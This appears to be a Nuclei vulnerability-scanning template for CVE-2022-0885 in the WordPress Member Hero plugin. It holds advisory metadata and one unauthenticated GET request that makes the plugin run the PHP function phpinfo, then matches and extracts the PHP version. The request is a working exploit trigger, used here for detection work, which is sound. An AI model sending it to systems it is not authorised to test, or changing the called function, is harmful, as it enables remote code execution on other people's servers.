id: CVE-2022-0885
info:
  name: Member Hero <=1.0.9 - Remote Code Execution
  author: theamanrawat
  severity: critical
  description: The vulnerability CVE-2022-0885 in the WordPress Member Hero plugin
    version 1.0.9 allows attackers to remotely execute arbitrary PHP functions without
    any authentication, potentially leading to unauthorized access, data manipulation,
    and compromised systems.
  reference:
  - https://wpscan.com/vulnerability/8b08b72e-5584-4f25-ab73-5ab0f47412df
  - https://wordpress.org/plugins/member-hero/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0885
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-0885
    cwe-id: CWE-94
  metadata:
    verified: 'true'
    impact: The vulnerability in WordPress Member Hero plugin allows an attacker to
      execute arbitrary PHP functions, potentially leading to malware execution, data
      modification, and full control over the targeted system.
    recommendation: It is recommended to immediately update the WordPress Member Hero
      plugin to a version above 1.0.9 to avoid the risk of remote code execution.
  tags: unauth,wpscan,wp-plugin,rce,wp,wordpress,member-hero,cve,cve2022
requests:
- method: GET
  path:
  - '{{BaseURL}}/wp-admin/admin-ajax.php?action=memberhero_send_form&_memberhero_hook=phpinfo'
  matchers-condition: and
  matchers:
  - type: word
    words:
    - PHP Extension
    - PHP Version
    - <!DOCTYPE html
    condition: and
  - type: status
    status:
    - 200
  extractors:
  - type: regex
    part: body
    group: 1
    regex:
    - '>PHP Version <\/td><td class="v">([0-9.]+)'
